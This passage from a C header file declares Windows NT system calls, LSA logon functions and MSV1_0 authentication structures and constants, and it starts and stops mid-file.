  IN BOOLEAN ReturnSingleEntry,
  IN PVOID SidList,
  IN ULONG SidListLength,
  IN PSID StartSid OPTIONAL,
  IN BOOLEAN RestartScan);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryVolumeInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID FsInformation,
  IN ULONG Length,
  IN FS_INFORMATION_CLASS FsInformationClass);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtReadFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  OUT PVOID Buffer,
  IN ULONG Length,
  IN PLARGE_INTEGER ByteOffset OPTIONAL,
  IN PULONG Key OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID FileInformation,
  IN ULONG Length,
  IN FILE_INFORMATION_CLASS FileInformationClass);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetQuotaInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID Buffer,
  IN ULONG Length);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetVolumeInformationFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID FsInformation,
  IN ULONG Length,
  IN FS_INFORMATION_CLASS FsInformationClass);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtWriteFile(
  IN HANDLE FileHandle,
  IN HANDLE Event OPTIONAL,
  IN PIO_APC_ROUTINE ApcRoutine OPTIONAL,
  IN PVOID ApcContext OPTIONAL,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PVOID Buffer,
  IN ULONG Length,
  IN PLARGE_INTEGER ByteOffset OPTIONAL,
  IN PULONG Key OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtUnlockFile(
  IN HANDLE FileHandle,
  OUT PIO_STATUS_BLOCK IoStatusBlock,
  IN PLARGE_INTEGER ByteOffset,
  IN PLARGE_INTEGER Length,
  IN ULONG Key);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetSecurityObject(
  IN HANDLE Handle,
  IN SECURITY_INFORMATION SecurityInformation,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQuerySecurityObject(
  IN HANDLE Handle,
  IN SECURITY_INFORMATION SecurityInformation,
  OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN ULONG Length,
  OUT PULONG LengthNeeded);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtClose(
  IN HANDLE Handle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtAllocateVirtualMemory(
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN ULONG_PTR ZeroBits,
  IN OUT PSIZE_T RegionSize,
  IN ULONG AllocationType,
  IN ULONG Protect);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtFreeVirtualMemory(
  IN HANDLE ProcessHandle,
  IN OUT PVOID *BaseAddress,
  IN OUT PSIZE_T RegionSize,
  IN ULONG FreeType);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenThreadTokenEx(
  IN HANDLE ThreadHandle,
  IN ACCESS_MASK DesiredAccess,
  IN BOOLEAN OpenAsSelf,
  IN ULONG HandleAttributes,
  OUT PHANDLE TokenHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenProcessTokenEx(
  IN HANDLE ProcessHandle,
  IN ACCESS_MASK DesiredAccess,
  IN ULONG HandleAttributes,
  OUT PHANDLE TokenHandle);

NTSYSAPI
NTSTATUS
NTAPI
NtOpenJobObjectToken(
  IN HANDLE JobHandle,
  IN ACCESS_MASK DesiredAccess,
  OUT PHANDLE TokenHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDuplicateToken(
  IN HANDLE ExistingTokenHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN BOOLEAN EffectiveOnly,
  IN TOKEN_TYPE TokenType,
  OUT PHANDLE NewTokenHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtFilterToken(
  IN HANDLE ExistingTokenHandle,
  IN ULONG Flags,
  IN PTOKEN_GROUPS SidsToDisable OPTIONAL,
  IN PTOKEN_PRIVILEGES PrivilegesToDelete OPTIONAL,
  IN PTOKEN_GROUPS RestrictedSids OPTIONAL,
  OUT PHANDLE NewTokenHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtImpersonateAnonymousToken(
  IN HANDLE ThreadHandle);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationToken(
  IN HANDLE TokenHandle,
  IN TOKEN_INFORMATION_CLASS TokenInformationClass,
  IN PVOID TokenInformation,
  IN ULONG TokenInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtAdjustGroupsToken(
  IN HANDLE TokenHandle,
  IN BOOLEAN ResetToDefault,
  IN PTOKEN_GROUPS NewState OPTIONAL,
  IN ULONG BufferLength OPTIONAL,
  OUT PTOKEN_GROUPS PreviousState,
  OUT PULONG ReturnLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrivilegeCheck(
  IN HANDLE ClientToken,
  IN OUT PPRIVILEGE_SET RequiredPrivileges,
  OUT PBOOLEAN Result);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtAccessCheckAndAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN PUNICODE_STRING ObjectTypeName,
  IN PUNICODE_STRING ObjectName,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN ACCESS_MASK DesiredAccess,
  IN PGENERIC_MAPPING GenericMapping,
  IN BOOLEAN ObjectCreation,
  OUT PACCESS_MASK GrantedAccess,
  OUT PNTSTATUS AccessStatus,
  OUT PBOOLEAN GenerateOnClose);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtAccessCheckByTypeAndAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId,
  IN PUNICODE_STRING ObjectTypeName,
  IN PUNICODE_STRING ObjectName,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSID PrincipalSelfSid OPTIONAL,
  IN ACCESS_MASK DesiredAccess,
  IN AUDIT_EVENT_TYPE AuditType,
  IN ULONG Flags,
  IN POBJECT_TYPE_LIST ObjectTypeList OPTIONAL,
  IN ULONG ObjectTypeLength,
  IN PGENERIC_MAPPING GenericMapping,
  IN BOOLEAN ObjectCreation,
  OUT PACCESS_MASK GrantedAccess,
  OUT PNTSTATUS AccessStatus,
  OUT PBOOLEAN GenerateOnClose);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtAccessCheckByTypeResultListAndAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN PUNICODE_STRING ObjectTypeName,
  IN PUNICODE_STRING ObjectName,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSID PrincipalSelfSid OPTIONAL,
  IN ACCESS_MASK DesiredAccess,
  IN AUDIT_EVENT_TYPE AuditType,
  IN ULONG Flags,
  IN POBJECT_TYPE_LIST ObjectTypeList OPTIONAL,
  IN ULONG ObjectTypeLength,
  IN PGENERIC_MAPPING GenericMapping,
  IN BOOLEAN ObjectCreation,
  OUT PACCESS_MASK GrantedAccess,
  OUT PNTSTATUS AccessStatus,
  OUT PBOOLEAN GenerateOnClose);

NTSTATUS
NTAPI
NtAccessCheckByTypeResultListAndAuditAlarmByHandle(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN HANDLE ClientToken,
  IN PUNICODE_STRING ObjectTypeName,
  IN PUNICODE_STRING ObjectName,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSID PrincipalSelfSid OPTIONAL,
  IN ACCESS_MASK DesiredAccess,
  IN AUDIT_EVENT_TYPE AuditType,
  IN ULONG Flags,
  IN POBJECT_TYPE_LIST ObjectTypeList OPTIONAL,
  IN ULONG ObjectTypeLength,
  IN PGENERIC_MAPPING GenericMapping,
  IN BOOLEAN ObjectCreation,
  OUT PACCESS_MASK GrantedAccess,
  OUT PNTSTATUS AccessStatus,
  OUT PBOOLEAN GenerateOnClose);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenObjectAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN PUNICODE_STRING ObjectTypeName,
  IN PUNICODE_STRING ObjectName,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
  IN HANDLE ClientToken,
  IN ACCESS_MASK DesiredAccess,
  IN ACCESS_MASK GrantedAccess,
  IN PPRIVILEGE_SET Privileges OPTIONAL,
  IN BOOLEAN ObjectCreation,
  IN BOOLEAN AccessGranted,
  OUT PBOOLEAN GenerateOnClose);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrivilegeObjectAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN HANDLE ClientToken,
  IN ACCESS_MASK DesiredAccess,
  IN PPRIVILEGE_SET Privileges,
  IN BOOLEAN AccessGranted);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCloseObjectAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN BOOLEAN GenerateOnClose);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeleteObjectAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PVOID HandleId OPTIONAL,
  IN BOOLEAN GenerateOnClose);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtPrivilegedServiceAuditAlarm(
  IN PUNICODE_STRING SubsystemName,
  IN PUNICODE_STRING ServiceName,
  IN HANDLE ClientToken,
  IN PPRIVILEGE_SET Privileges,
  IN BOOLEAN AccessGranted);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetInformationThread(
  IN HANDLE ThreadHandle,
  IN THREADINFOCLASS ThreadInformationClass,
  IN PVOID ThreadInformation,
  IN ULONG ThreadInformationLength);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtCreateSection(
  OUT PHANDLE SectionHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER MaximumSize OPTIONAL,
  IN ULONG SectionPageProtection,
  IN ULONG AllocationAttributes,
  IN HANDLE FileHandle OPTIONAL);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#define COMPRESSION_FORMAT_NONE         (0x0000)
#define COMPRESSION_FORMAT_DEFAULT      (0x0001)
#define COMPRESSION_FORMAT_LZNT1        (0x0002)
#define COMPRESSION_ENGINE_STANDARD     (0x0000)
#define COMPRESSION_ENGINE_MAXIMUM      (0x0100)
#define COMPRESSION_ENGINE_HIBER        (0x0200)

#define MAX_UNICODE_STACK_BUFFER_LENGTH 256

#define METHOD_FROM_CTL_CODE(ctrlCode)  ((ULONG)(ctrlCode & 3))

#define METHOD_DIRECT_TO_HARDWARE       METHOD_IN_DIRECT
#define METHOD_DIRECT_FROM_HARDWARE     METHOD_OUT_DIRECT

typedef ULONG LSA_OPERATIONAL_MODE, *PLSA_OPERATIONAL_MODE;

typedef enum _SECURITY_LOGON_TYPE {
  UndefinedLogonType = 0,
  Interactive = 2,
  Network,
  Batch,
  Service,
  Proxy,
  Unlock,
  NetworkCleartext,
  NewCredentials,
#if (_WIN32_WINNT >= 0x0501)
  RemoteInteractive,
  CachedInteractive,
#endif
#if (_WIN32_WINNT >= 0x0502)
  CachedRemoteInteractive,
  CachedUnlock
#endif
} SECURITY_LOGON_TYPE, *PSECURITY_LOGON_TYPE;

#ifndef _NTLSA_AUDIT_
#define _NTLSA_AUDIT_

#ifndef GUID_DEFINED
#include <guiddef.h>
#endif

#endif /* _NTLSA_AUDIT_ */

NTSTATUS
NTAPI
LsaRegisterLogonProcess(
  IN PLSA_STRING LogonProcessName,
  OUT PHANDLE LsaHandle,
  OUT PLSA_OPERATIONAL_MODE SecurityMode);

NTSTATUS
NTAPI
LsaLogonUser(
  IN HANDLE LsaHandle,
  IN PLSA_STRING OriginName,
  IN SECURITY_LOGON_TYPE LogonType,
  IN ULONG AuthenticationPackage,
  IN PVOID AuthenticationInformation,
  IN ULONG AuthenticationInformationLength,
  IN PTOKEN_GROUPS LocalGroups OPTIONAL,
  IN PTOKEN_SOURCE SourceContext,
  OUT PVOID *ProfileBuffer,
  OUT PULONG ProfileBufferLength,
  OUT PLUID LogonId,
  OUT PHANDLE Token,
  OUT PQUOTA_LIMITS Quotas,
  OUT PNTSTATUS SubStatus);

NTSTATUS
NTAPI
LsaFreeReturnBuffer(
  IN PVOID Buffer);

#ifndef _NTLSA_IFS_
#define _NTLSA_IFS_
#endif

#define MSV1_0_PACKAGE_NAME     "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"
#define MSV1_0_PACKAGE_NAMEW    L"MICROSOFT_AUTHENTICATION_PACKAGE_V1_0"
#define MSV1_0_PACKAGE_NAMEW_LENGTH sizeof(MSV1_0_PACKAGE_NAMEW) - sizeof(WCHAR)

#define MSV1_0_SUBAUTHENTICATION_KEY "SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0"
#define MSV1_0_SUBAUTHENTICATION_VALUE "Auth"

#define MSV1_0_CHALLENGE_LENGTH                8
#define MSV1_0_USER_SESSION_KEY_LENGTH         16
#define MSV1_0_LANMAN_SESSION_KEY_LENGTH       8

#define MSV1_0_CLEARTEXT_PASSWORD_ALLOWED      0x02
#define MSV1_0_UPDATE_LOGON_STATISTICS         0x04
#define MSV1_0_RETURN_USER_PARAMETERS          0x08
#define MSV1_0_DONT_TRY_GUEST_ACCOUNT          0x10
#define MSV1_0_ALLOW_SERVER_TRUST_ACCOUNT      0x20
#define MSV1_0_RETURN_PASSWORD_EXPIRY          0x40
#define MSV1_0_USE_CLIENT_CHALLENGE            0x80
#define MSV1_0_TRY_GUEST_ACCOUNT_ONLY          0x100
#define MSV1_0_RETURN_PROFILE_PATH             0x200
#define MSV1_0_TRY_SPECIFIED_DOMAIN_ONLY       0x400
#define MSV1_0_ALLOW_WORKSTATION_TRUST_ACCOUNT 0x800

#define MSV1_0_DISABLE_PERSONAL_FALLBACK     0x00001000
#define MSV1_0_ALLOW_FORCE_GUEST             0x00002000

#if (_WIN32_WINNT >= 0x0502)
#define MSV1_0_CLEARTEXT_PASSWORD_SUPPLIED   0x00004000
#define MSV1_0_USE_DOMAIN_FOR_ROUTING_ONLY   0x00008000
#endif

#define MSV1_0_SUBAUTHENTICATION_DLL_EX      0x00100000
#define MSV1_0_ALLOW_MSVCHAPV2               0x00010000

#if (_WIN32_WINNT >= 0x0600)
#define MSV1_0_S4U2SELF                      0x00020000
#define MSV1_0_CHECK_LOGONHOURS_FOR_S4U      0x00040000
#endif

#define MSV1_0_SUBAUTHENTICATION_DLL         0xFF000000
#define MSV1_0_SUBAUTHENTICATION_DLL_SHIFT   24
#define MSV1_0_MNS_LOGON                     0x01000000

#define MSV1_0_SUBAUTHENTICATION_DLL_RAS     2
#define MSV1_0_SUBAUTHENTICATION_DLL_IIS     132

#define LOGON_GUEST                 0x01
#define LOGON_NOENCRYPTION          0x02
#define LOGON_CACHED_ACCOUNT        0x04
#define LOGON_USED_LM_PASSWORD      0x08
#define LOGON_EXTRA_SIDS            0x20
#define LOGON_SUBAUTH_SESSION_KEY   0x40
#define LOGON_SERVER_TRUST_ACCOUNT  0x80
#define LOGON_NTLMV2_ENABLED        0x100
#define LOGON_RESOURCE_GROUPS       0x200
#define LOGON_PROFILE_PATH_RETURNED 0x400
#define LOGON_NT_V2                 0x800
#define LOGON_LM_V2                 0x1000
#define LOGON_NTLM_V2               0x2000

#if (_WIN32_WINNT >= 0x0600)

#define LOGON_OPTIMIZED             0x4000
#define LOGON_WINLOGON              0x8000
#define LOGON_PKINIT               0x10000
#define LOGON_NO_OPTIMIZED         0x20000

#endif

#define MSV1_0_SUBAUTHENTICATION_FLAGS 0xFF000000

#define LOGON_GRACE_LOGON              0x01000000

#define MSV1_0_OWF_PASSWORD_LENGTH 16
#define MSV1_0_CRED_LM_PRESENT 0x1
#define MSV1_0_CRED_NT_PRESENT 0x2
#define MSV1_0_CRED_VERSION 0

#define MSV1_0_NTLM3_RESPONSE_LENGTH 16
#define MSV1_0_NTLM3_OWF_LENGTH 16

#if (_WIN32_WINNT == 0x0500)
#define MSV1_0_MAX_NTLM3_LIFE 1800
#else
#define MSV1_0_MAX_NTLM3_LIFE 129600
#endif
#define MSV1_0_MAX_AVL_SIZE 64000

#if (_WIN32_WINNT >= 0x0501)

#define MSV1_0_AV_FLAG_FORCE_GUEST                  0x00000001

#if (_WIN32_WINNT >= 0x0600)
#define MSV1_0_AV_FLAG_MIC_HANDSHAKE_MESSAGES       0x00000002
#endif

#endif

#define MSV1_0_NTLM3_INPUT_LENGTH (sizeof(MSV1_0_NTLM3_RESPONSE) - MSV1_0_NTLM3_RESPONSE_LENGTH)

#if(_WIN32_WINNT >= 0x0502)
#define MSV1_0_NTLM3_MIN_NT_RESPONSE_LENGTH RTL_SIZEOF_THROUGH_FIELD(MSV1_0_NTLM3_RESPONSE, AvPairsOff)
#endif

#define USE_PRIMARY_PASSWORD            0x01
#define RETURN_PRIMARY_USERNAME         0x02
#define RETURN_PRIMARY_LOGON_DOMAINNAME 0x04
#define RETURN_NON_NT_USER_SESSION_KEY  0x08
#define GENERATE_CLIENT_CHALLENGE       0x10
#define GCR_NTLM3_PARMS                 0x20
#define GCR_TARGET_INFO                 0x40
#define RETURN_RESERVED_PARAMETER       0x80
#define GCR_ALLOW_NTLM                 0x100
#define GCR_USE_OEM_SET                0x200
#define GCR_MACHINE_CREDENTIAL         0x400
#define GCR_USE_OWF_PASSWORD           0x800
#define GCR_ALLOW_LM                  0x1000
#define GCR_ALLOW_NO_TARGET           0x2000

typedef enum _MSV1_0_LOGON_SUBMIT_TYPE {
  MsV1_0InteractiveLogon = 2,
  MsV1_0Lm20Logon,
  MsV1_0NetworkLogon,
  MsV1_0SubAuthLogon,
  MsV1_0WorkstationUnlockLogon = 7,
  MsV1_0S4ULogon = 12,
  MsV1_0VirtualLogon = 82
} MSV1_0_LOGON_SUBMIT_TYPE, *PMSV1_0_LOGON_SUBMIT_TYPE;

typedef enum _MSV1_0_PROFILE_BUFFER_TYPE {
  MsV1_0InteractiveProfile = 2,
  MsV1_0Lm20LogonProfile,
  MsV1_0SmartCardProfile
} MSV1_0_PROFILE_BUFFER_TYPE, *PMSV1_0_PROFILE_BUFFER_TYPE;

typedef struct _MSV1_0_INTERACTIVE_LOGON {
  MSV1_0_LOGON_SUBMIT_TYPE MessageType;
  UNICODE_STRING LogonDomainName;
  UNICODE_STRING UserName;
  UNICODE_STRING Password;
} MSV1_0_INTERACTIVE_LOGON, *PMSV1_0_INTERACTIVE_LOGON;

typedef struct _MSV1_0_INTERACTIVE_PROFILE {
  MSV1_0_PROFILE_BUFFER_TYPE MessageType;
  USHORT LogonCount;
  USHORT BadPasswordCount;
  LARGE_INTEGER LogonTime;
  LARGE_INTEGER LogoffTime;
  LARGE_INTEGER KickOffTime;
  LARGE_INTEGER PasswordLastSet;
  LARGE_INTEGER PasswordCanChange;
  LARGE_INTEGER PasswordMustChange;
  UNICODE_STRING LogonScript;
  UNICODE_STRING HomeDirectory;
  UNICODE_STRING FullName;
  UNICODE_STRING ProfilePath;
  UNICODE_STRING HomeDirectoryDrive;
  UNICODE_STRING LogonServer;
  ULONG UserFlags;
} MSV1_0_INTERACTIVE_PROFILE, *PMSV1_0_INTERACTIVE_PROFILE;

typedef struct _MSV1_0_LM20_LOGON {
  MSV1_0_LOGON_SUBMIT_TYPE MessageType;
  UNICODE_STRING LogonDomainName;
  UNICODE_STRING UserName;
  UNICODE_STRING Workstation;
  UCHAR ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
  STRING CaseSensitiveChallengeResponse;
  STRING CaseInsensitiveChallengeResponse;
  ULONG ParameterControl;
} MSV1_0_LM20_LOGON, * PMSV1_0_LM20_LOGON;

typedef struct _MSV1_0_SUBAUTH_LOGON {
  MSV1_0_LOGON_SUBMIT_TYPE MessageType;
  UNICODE_STRING LogonDomainName;
  UNICODE_STRING UserName;
  UNICODE_STRING Workstation;
  UCHAR ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
  STRING AuthenticationInfo1;
  STRING AuthenticationInfo2;
  ULONG ParameterControl;
  ULONG SubAuthPackageId;
} MSV1_0_SUBAUTH_LOGON, * PMSV1_0_SUBAUTH_LOGON;

#if (_WIN32_WINNT >= 0x0600)

#define MSV1_0_S4U_LOGON_FLAG_CHECK_LOGONHOURS 0x2

typedef struct _MSV1_0_S4U_LOGON {
  MSV1_0_LOGON_SUBMIT_TYPE MessageType;
  ULONG Flags;
  UNICODE_STRING UserPrincipalName;
  UNICODE_STRING DomainName;
} MSV1_0_S4U_LOGON, *PMSV1_0_S4U_LOGON;

#endif

typedef struct _MSV1_0_LM20_LOGON_PROFILE {
  MSV1_0_PROFILE_BUFFER_TYPE MessageType;
  LARGE_INTEGER KickOffTime;
  LARGE_INTEGER LogoffTime;
  ULONG UserFlags;
  UCHAR UserSessionKey[MSV1_0_USER_SESSION_KEY_LENGTH];
  UNICODE_STRING LogonDomainName;
  UCHAR LanmanSessionKey[MSV1_0_LANMAN_SESSION_KEY_LENGTH];
  UNICODE_STRING LogonServer;
  UNICODE_STRING UserParameters;
} MSV1_0_LM20_LOGON_PROFILE, * PMSV1_0_LM20_LOGON_PROFILE;

typedef struct _MSV1_0_SUPPLEMENTAL_CREDENTIAL {
  ULONG Version;
  ULONG Flags;
  UCHAR LmPassword[MSV1_0_OWF_PASSWORD_LENGTH];
  UCHAR NtPassword[MSV1_0_OWF_PASSWORD_LENGTH];
} MSV1_0_SUPPLEMENTAL_CREDENTIAL, *PMSV1_0_SUPPLEMENTAL_CREDENTIAL;

typedef struct _MSV1_0_NTLM3_RESPONSE {
  UCHAR Response[MSV1_0_NTLM3_RESPONSE_LENGTH];
  UCHAR RespType;
  UCHAR HiRespType;
  USHORT Flags;
  ULONG MsgWord;
  ULONGLONG TimeStamp;
  UCHAR ChallengeFromClient[MSV1_0_CHALLENGE_LENGTH];
  ULONG AvPairsOff;
  UCHAR Buffer[1];
} MSV1_0_NTLM3_RESPONSE, *PMSV1_0_NTLM3_RESPONSE;

/* MsvAvSingleHost present in MS-NLMP specifications but not in WinSDK */
typedef enum _MSV1_0_AVID {
  MsvAvEOL,
  MsvAvNbComputerName,
  MsvAvNbDomainName,
  MsvAvDnsComputerName,
  MsvAvDnsDomainName,
#if (_WIN32_WINNT >= 0x0501)
  MsvAvDnsTreeName,
  MsvAvFlags,
#if (_WIN32_WINNT >= 0x0600)
  MsvAvTimestamp,
  MsvAvRestrictions,
  MsvAvSingleHost = MsvAvRestrictions,
  MsvAvTargetName,
  MsvAvChannelBindings,
#endif
#endif
} MSV1_0_AVID;

typedef struct _MSV1_0_AV_PAIR {
  USHORT AvId;
  USHORT AvLen;
} MSV1_0_AV_PAIR, *PMSV1_0_AV_PAIR;

typedef enum _MSV1_0_PROTOCOL_MESSAGE_TYPE {
  MsV1_0Lm20ChallengeRequest = 0,
  MsV1_0Lm20GetChallengeResponse,
  MsV1_0EnumerateUsers,
  MsV1_0GetUserInfo,
  MsV1_0ReLogonUsers,
  MsV1_0ChangePassword,
  MsV1_0ChangeCachedPassword,
  MsV1_0GenericPassthrough,
  MsV1_0CacheLogon,
  MsV1_0SubAuth,
  MsV1_0DeriveCredential,
  MsV1_0CacheLookup,
#if (_WIN32_WINNT >= 0x0501)
  MsV1_0SetProcessOption,
#endif
#if (_WIN32_WINNT >= 0x0600)
  MsV1_0ConfigLocalAliases,
  MsV1_0ClearCachedCredentials,
#endif
} MSV1_0_PROTOCOL_MESSAGE_TYPE, *PMSV1_0_PROTOCOL_MESSAGE_TYPE;

typedef struct _MSV1_0_LM20_CHALLENGE_REQUEST {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
} MSV1_0_LM20_CHALLENGE_REQUEST, *PMSV1_0_LM20_CHALLENGE_REQUEST;

typedef struct _MSV1_0_LM20_CHALLENGE_RESPONSE {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  UCHAR ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
} MSV1_0_LM20_CHALLENGE_RESPONSE, *PMSV1_0_LM20_CHALLENGE_RESPONSE;

typedef struct _MSV1_0_GETCHALLENRESP_REQUEST_V1 {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  ULONG ParameterControl;
  LUID LogonId;
  UNICODE_STRING Password;
  UCHAR ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
} MSV1_0_GETCHALLENRESP_REQUEST_V1, *PMSV1_0_GETCHALLENRESP_REQUEST_V1;

typedef struct _MSV1_0_GETCHALLENRESP_REQUEST {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  ULONG ParameterControl;
  LUID LogonId;
  UNICODE_STRING Password;
  UCHAR ChallengeToClient[MSV1_0_CHALLENGE_LENGTH];
  UNICODE_STRING UserName;
  UNICODE_STRING LogonDomainName;
  UNICODE_STRING ServerName;
} MSV1_0_GETCHALLENRESP_REQUEST, *PMSV1_0_GETCHALLENRESP_REQUEST;

typedef struct _MSV1_0_GETCHALLENRESP_RESPONSE {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  STRING CaseSensitiveChallengeResponse;
  STRING CaseInsensitiveChallengeResponse;
  UNICODE_STRING UserName;
  UNICODE_STRING LogonDomainName;
  UCHAR UserSessionKey[MSV1_0_USER_SESSION_KEY_LENGTH];
  UCHAR LanmanSessionKey[MSV1_0_LANMAN_SESSION_KEY_LENGTH];
} MSV1_0_GETCHALLENRESP_RESPONSE, *PMSV1_0_GETCHALLENRESP_RESPONSE;

typedef struct _MSV1_0_ENUMUSERS_REQUEST {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
} MSV1_0_ENUMUSERS_REQUEST, *PMSV1_0_ENUMUSERS_REQUEST;

typedef struct _MSV1_0_ENUMUSERS_RESPONSE {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  ULONG NumberOfLoggedOnUsers;
  PLUID LogonIds;
  PULONG EnumHandles;
} MSV1_0_ENUMUSERS_RESPONSE, *PMSV1_0_ENUMUSERS_RESPONSE;

typedef struct _MSV1_0_GETUSERINFO_REQUEST {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  LUID LogonId;
} MSV1_0_GETUSERINFO_REQUEST, *PMSV1_0_GETUSERINFO_REQUEST;

typedef struct _MSV1_0_GETUSERINFO_RESPONSE {
  MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
  PSID UserSid;
  UNICODE_STRING UserName;
  UNICODE_STRING LogonDomainName;
  UNICODE_STRING LogonServer;
  SECURITY_LOGON_TYPE LogonType;
} MSV1_0_GETUSERINFO_RESPONSE, *PMSV1_0_GETUSERINFO_RESPONSE;



#define FILE_OPLOCK_BROKEN_TO_LEVEL_2   0x00000007
#define FILE_OPLOCK_BROKEN_TO_NONE      0x00000008
#define FILE_OPBATCH_BREAK_UNDERWAY     0x00000009

/* also in winnt.h */
#define FILE_NOTIFY_CHANGE_FILE_NAME    0x00000001
#define FILE_NOTIFY_CHANGE_DIR_NAME     0x00000002
#define FILE_NOTIFY_CHANGE_NAME         0x00000003
#define FILE_NOTIFY_CHANGE_ATTRIBUTES   0x00000004
#define FILE_NOTIFY_CHANGE_SIZE         0x00000008
#define FILE_NOTIFY_CHANGE_LAST_WRITE   0x00000010
#define FILE_NOTIFY_CHANGE_LAST_ACCESS  0x00000020
#define FILE_NOTIFY_CHANGE_CREATION     0x00000040
#define FILE_NOTIFY_CHANGE_EA           0x00000080
#define FILE_NOTIFY_CHANGE_SECURITY     0x00000100
#define FILE_NOTIFY_CHANGE_STREAM_NAME  0x00000200
#define FILE_NOTIFY_CHANGE_STREAM_SIZE  0x00000400
#define FILE_NOTIFY_CHANGE_STREAM_WRITE 0x00000800
#define FILE_NOTIFY_VALID_MASK          0x00000fff

#define FILE_ACTION_ADDED                   0x00000001
#define FILE_ACTION_REMOVED                 0x00000002
#define FILE_ACTION_MODIFIED                0x00000003
#define FILE_ACTION_RENAMED_OLD_NAME        0x00000004
#define FILE_ACTION_RENAMED_NEW_NAME        0x00000005
#define FILE_ACTION_ADDED_STREAM            0x00000006
#define FILE_ACTION_REMOVED_STREAM          0x00000007
#define FILE_ACTION_MODIFIED_STREAM         0x00000008
#define FILE_ACTION_REMOVED_BY_DELETE       0x00000009
#define FILE_ACTION_ID_NOT_TUNNELLED        0x0000000A
#define FILE_ACTION_TUNNELLED_ID_COLLISION  0x0000000B
/* end  winnt.h */

#define FILE_PIPE_BYTE_STREAM_TYPE          0x00000000
#define FILE_PIPE_MESSAGE_TYPE              0x00000001

#define FILE_PIPE_ACCEPT_REMOTE_CLIENTS     0x00000000
#define FILE_PIPE_REJECT_REMOTE_CLIENTS     0x00000002

#define FILE_PIPE_TYPE_VALID_MASK           0x00000003

#define FILE_PIPE_BYTE_STREAM_MODE          0x00000000
